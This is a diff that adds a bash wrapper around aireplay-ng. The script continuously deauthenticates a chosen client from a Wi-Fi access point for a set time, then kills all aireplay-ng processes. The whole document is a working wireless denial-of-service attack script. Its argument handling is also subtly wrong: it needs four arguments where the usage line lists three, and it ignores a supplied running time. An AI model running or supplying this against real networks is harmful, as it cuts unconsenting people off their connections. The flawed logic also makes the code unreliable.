@@ -1,0 +1,24 @@
+#!/bin/bash
+
+# WARNING: THIS SCRIPT WILL TERMINATE ALL PROCESSES OF TYPE 'aireplay-ng', EVEN IF THEY ARE NOT ASSOCIATED WITH THE SCRIPT
+#
+# function:
+#	 deauthenticates a client from an access point for a given time interval, by running 'aireplay-ng' and killing it after a given time intervall
+# usage:
+#	 ./aireplay_wrapper <access point bssid> <client bssid> <interface> [running-time]
+
+if [ $# -gt 3 ]
+then
+	RUNNING_TIME=180
+
+	if [ $# -gt 4 ]
+	then
+		RUNNING_TIME=$4
+	fi
+
+	sudo aireplay-ng -0 0 -a $1 -c $2 $3 &
+	sleep $RUNNING_TIME
+	sudo killall aireplay-ng
+else
+	echo "Error in $0: Not enough arguments"
+fi
